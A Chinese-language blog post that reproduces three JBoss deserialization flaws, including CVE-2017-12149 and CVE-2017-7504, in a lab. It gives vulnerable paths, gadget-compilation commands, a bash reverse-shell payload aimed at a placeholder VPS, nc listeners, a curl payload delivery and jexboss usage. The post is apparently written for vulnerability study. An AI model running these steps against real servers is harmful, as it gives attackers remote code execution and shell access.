---
title: JBoss漏洞复现
date: 2021-01-07 21:31:32
categories: 漏洞复现
tags: JBoss
---

#### 背景

JBOSS是一个基于J2EE的[开放源代码](https://baike.baidu.com/item/开放源代码)的[应用服务器](https://baike.baidu.com/item/应用服务器)。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。

<!--more-->

#### JBoss反序列化漏洞(CVE-2017-12149)

##### 影响版本

1. JBoss 5.x
2. JBoss 6.x

##### 漏洞成因

Java反序列化错误类型引发该漏洞，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

#### 复现过程

1.JBoss主页

![](https://cdn.laohuan.art/jboss%E4%B8%BB%E9%A1%B5_2021-01-05_21-32-52.png)

2.漏洞路径

`/invoker/readonly`

访问路径出现500错误，便可能出现此漏洞

![](https://cdn.laohuan.art/Snipaste_2021-01-05_21-40-22.png)

3.工具

![](https://cdn.laohuan.art/Snipaste_2021-01-05_21-37-53.png)

#### 反序列化(CVE-2017-7504)

##### 影响版本

JBoss 4.x 及之前版本

##### 成因

Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

##### 漏洞路径

`/jbossmq-httpil/HTTPServerILServlet`

##### 复现过程

1.工具套件

- [https://github.com/joaomatosf/JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)

2.`javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java`

命令执行完毕生成***ExampleCommonsCollections1WithHashMap.class**文件*

3.`java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/x.x.x.x/80 0>&1"`

反弹地址改为自己的VPS地址，命令执行后生成**ExampleCommonsCollections1WithHashMap.ser**

4.服务器开启NC监听

`nc -lvp 80`

5.`curl http://192.168.0.108:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser`

![](https://cdn.laohuan.art/Snipaste_2021-01-05_22-45-44.png)

6.获得shell

![](https://cdn.laohuan.art/Snipaste_2021-01-05_22-41-52.png)

#### JBoss JMXInvokerServlet 反序列化漏洞

##### 成因

这是经典的JBoss反序列化漏洞，JBoss在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。

##### 验证方式

访问IP+端口/invoker/JMXInvokerServlet，只要有文件下载，目标网站即存在JBoss JMXInvokerServlet 反序列化漏洞

##### 复现过程

1.工具

[[DeserializeExploit.jar](https://cdn.vulhub.org/deserialization/DeserializeExploit.jar)]

2.工具

[https://github.com/joaomatosf/jexboss](https://github.com/joaomatosf/jexboss)

`python jexboss.py -u http://192.168.0.108:8080`

![](https://cdn.laohuan.art/Snipaste_2021-01-06_23-13-47.png)

输入yes

填写反弹IP端口

![](https://cdn.laohuan.art/Snipaste_2021-01-06_23-15-01.png)

启动NC监听

`nc -lvp 80`

反弹成功

![](https://cdn.laohuan.art/Snipaste_2021-01-06_23-12-50.png)

参考链接

- [https://github.com/vulhub/vulhub/tree/master/jboss](https://github.com/vulhub/vulhub/tree/master/jboss)
- [https://www.pianshen.com/article/11401315597/](https://www.pianshen.com/article/11401315597/)
- [https://www.cnblogs.com/yuzly/p/11240101.html](https://www.cnblogs.com/yuzly/p/11240101.html)
- [https://www.cnblogs.com/iamver/p/11282928.html](https://www.cnblogs.com/iamver/p/11282928.html)
- [https://www.cnblogs.com/sevck/p/7874438.html](https://www.cnblogs.com/sevck/p/7874438.html)

